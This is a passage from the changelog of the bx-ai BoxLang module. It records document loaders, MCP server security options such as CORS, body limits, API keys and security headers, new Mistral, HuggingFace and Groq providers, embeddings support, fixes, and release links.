    - `MarkdownLoader`: Markdown files with header splitting, code block removal
    - `HTMLLoader`: HTML files and URLs with script/style removal, tag extraction
    - `CSVLoader`: CSV files with row-as-document mode, column filtering
    - `JSONLoader`: JSON files with field extraction, array-as-documents mode
    - `DirectoryLoader`: Batch loading from directories with recursive scanning
  - Fluent API for loader configuration
  - Integration with memory systems via `loadTo()` method and `aiMemoryIngest()` BIF
  - Automatic document chunking support for vector memory
  - Comprehensive documentation in `docs/main-components/document-loaders.md`
- **MCP Server Enterprise Security Features**: Comprehensive security enhancements for MCP servers
  - **CORS Configuration**:
    - `withCors(origins)` - Configure allowed origins (string or array)
    - `addCorsOrigin(origin)` - Add origin dynamically
    - `getCorsAllowedOrigins()` - Get configured origins array
    - `isCorsAllowed(origin)` - Check if origin is allowed with wildcard matching
    - Support for wildcard patterns (`*.example.com`)
    - Support for allowing all origins (`*`)
    - Dynamic `Access-Control-Allow-Origin` header in responses
    - CORS headers included in OPTIONS preflight responses
  - **Request Body Size Limits**:
    - `withBodyLimit(maxBytes)` - Set maximum request body size in bytes
    - `getMaxRequestBodySize()` - Get current limit (0 = unlimited)
    - Returns 413 Payload Too Large error when exceeded
    - Protects against DoS attacks with oversized payloads
  - **Custom API Key Validation**:
    - `withApiKeyProvider(provider)` - Set custom API key validation callback
    - `hasApiKeyProvider()` - Check if provider is configured
    - `verifyApiKey(apiKey, requestData)` - Manual key validation
    - Supports `X-API-Key` header and `Authorization: Bearer` token
    - Provider receives API key and request context for flexible validation
    - Returns 401 Unauthorized for invalid keys
  - **Security Headers**: Automatic inclusion of industry-standard security headers in all responses
    - `X-Content-Type-Options: nosniff`
    - `X-Frame-Options: DENY`
    - `X-XSS-Protection: 1; mode=block`
    - `Referrer-Policy: strict-origin-when-cross-origin`
    - `Content-Security-Policy: default-src 'none'; frame-ancestors 'none'`
    - `Strict-Transport-Security: max-age=31536000; includeSubDomains`
    - `Permissions-Policy: geolocation=(), microphone=(), camera=()`
  - **Security Processing Order**: Body size → CORS → Basic Auth → API Key → Request processing
  - Comprehensive documentation in `docs/advanced/mcp-server.md` with examples
  - Security configuration examples in main README.md
  - 9 new integration tests covering all security features
- **Mistral AI Provider Support**: Full integration with Mistral AI services
  - New `MistralService` provider class with OpenAI-compatible API
  - Chat completions with streaming support
  - Embeddings support with `mistral-embed` model
  - Tool/function calling support
  - Default model: `mistral-small-latest`
  - API key detection via `MISTRAL_API_KEY` environment variable
  - Comprehensive integration tests
- **HuggingFace Provider Support**: Full integration with HuggingFace Inference API
  - New `HuggingFaceService` provider class extending BaseService
  - OpenAI-compatible API endpoint at `router.huggingface.co/v1`
  - Default model: `Qwen/Qwen2.5-72B-Instruct`
  - Support for chat completions and embeddings
  - Integration tests for HuggingFace provider
  - API key pattern: `HUGGINGFACE_API_KEY`
- **Groq Provider Support**: Full integration with Groq AI services for fast inference
  - Uses OpenAI-compatible API at `api.groq.com`
  - Default model: `llama-3.3-70b-versatile`
  - Support for chat completions, streaming, and embeddings
  - Environment variable: `GROQ_API_KEY`
- **Embeddings Support**: Complete embeddings functionality for semantic search, clustering, and recommendations
  - New `aiEmbedding()` BIF for generating text embeddings
  - New `AiEmbeddingRequest` class to model embedding requests
  - New `embeddings()` method in `IAiService` interface
  - Support for single text and batch text embedding generation
  - Multiple return formats: raw, embeddings, first
  - **Provider Support**:
    - OpenAI: `text-embedding-3-small` and `text-embedding-3-large` models
    - Ollama: Local embeddings for privacy-sensitive use cases
    - DeepSeek: OpenAI-compatible embeddings API
    - Grok: OpenAI-compatible embeddings API
    - OpenRouter: Aggregated embeddings via multiple models
    - Gemini: Custom implementation with `text-embedding-004` model
  - New embedding-specific events: `onAIEmbeddingRequest`, `onAIEmbeddingResponse`, `beforeAIEmbedding`, `afterAIEmbedding`
  - Comprehensive embeddings documentation in README with examples
  - New `examples/embeddings-example.bx` demonstrating practical use cases
  - Integration tests for embeddings functionality
- ChatMessage now has the following new methods:
  - `format(bindings)` - Formats messages with provided bindings.
  - `render()` - Renders messages using stored bindings.
  - `bind( bindings )` - Binds variables to be used in message formatting.
  - `getBindings(), setBindings( bindings )` - Getters and setters for bindings.
- Detect API Keys by convention in `AIService()` BIF: `<PROVIDER>_API_KEY` from system settings
- **OpenRouter Provider Support**: Full integration with OpenRouter AI services
- Automatic JSON serialization for tool calls that don't return strings
- **Ollama Provider Support**: Complete integration with Ollama for local AI model execution
- **Comprehensive Provider Test Suite**: Individual test files for each AI provider
- **Streaming Support Validation**: Verified aiChatStream() functionality across all providers
- **Docker Compose Testing Infrastructure**: Automated local development and CI/CD support
- **Enhanced GitHub Actions Workflow**: Improved CI/CD pipeline with AI service support
- **BIF Reference Documentation**: Complete function reference table in README
- **Comprehensive Event Documentation**: Complete event system documentation

### Fixed

- If a tool argument doesn't have a description, it would cause an error when generating the schema. Default it to the argument name.
- **Model Name Compatibility**: Updated OllamaService default model from llama3.2 to qwen2.5:0.5b-instruct
- **Docker GPU Support**: Made GPU configuration optional in docker-compose.yml for systems without GPU access
- **Test Model References**: Corrected model names in Ollama tests to match available models

## [1.2.0] - 2025-06-19

### Added

- New gradle wrapper and build system
- New `Tool.getArgumentsSchema()` method to retrieve the arguments schema for use by any provider.
- New logging params for console debugging: `logRequestToConsole`, `logResponseToConsole`
- Tool support for Claude LLMs
- Tool message for open ai tools when no local tools are available.
- New `ChatMessage` helper method: `getNonSystemMessages()` to retrieve all messages except the system message.
- `ChatRequest` now has the original `ChatMessage` as a property, so you can access the original message in the request.
- Latest Claude Sonnet model support: `claude-sonnet-4-0` as its default.
- Streamline of env on tests
- Added to the config the following options: `logRequest`, `logResponse`, `timeout`, `returnFormat`, so you can control the behavior of the services globally.
- Some compatibilities so it can be used in CFML apps.
- Ability for AI responses to be influenced by the `onAIResponse` event.

### Fixed

- Version pinned to `1.0.0` in the `box.json` file by accident.

## [1.1.0] - 2025-05-17

### Added

- Claude LLM Support
- Ability for the services to pre-seed params into chat requests
- Ability for the services to pre-seed headers into chat requests
- Error logging for the services

### Fixed

- Custom headers could not be added due to closure encapsulation

## [1.0.1] - 2025-03-21

### Fixed

- Missing the `settings` in the module config.
- Invalid name for the module config.

## [1.0.0] - 2025-03-17

- First iteration of this module

[unreleased]: https://github.com/ortus-boxlang/bx-ai/compare/v3.3.2...HEAD
[3.3.2]: https://github.com/ortus-boxlang/bx-ai/compare/v3.3.1...v3.3.2
[3.3.1]: https://github.com/ortus-boxlang/bx-ai/compare/v3.3.0...v3.3.1
[3.3.0]: https://github.com/ortus-boxlang/bx-ai/compare/v3.2.0...v3.3.0
[3.2.0]: https://github.com/ortus-boxlang/bx-ai/compare/v3.1.0...v3.2.0
[3.1.0]: https://github.com/ortus-boxlang/bx-ai/compare/v3.0.0...v3.1.0
[3.0.0]: https://github.com/ortus-boxlang/bx-ai/compare/v2.4.0...v3.0.0
[2.4.0]: https://github.com/ortus-boxlang/bx-ai/compare/v2.3.0...v2.4.0
[2.3.0]: https://github.com/ortus-boxlang/bx-ai/compare/v2.2.0...v2.3.0
[2.2.0]: https://github.com/ortus-boxlang/bx-ai/compare/v2.1.0...v2.2.0
[2.1.0]: https://github.com/ortus-boxlang/bx-ai/compare/v2.0.0...v2.1.0
[2.0.0]: https://github.com/ortus-boxlang/bx-ai/compare/v1.2.0...v2.0.0
[1.2.0]: https://github.com/ortus-boxlang/bx-ai/compare/v1.1.0...v1.2.0
[1.1.0]: https://github.com/ortus-boxlang/bx-ai/compare/v1.0.1...v1.1.0
[1.0.1]: https://github.com/ortus-boxlang/bx-ai/compare/v1.0.0...v1.0.1
[1.0.0]: https://github.com/ortus-boxlang/bx-ai/compare/75d7de99df83fbf553920bec4c601f825506820a...v1.0.0
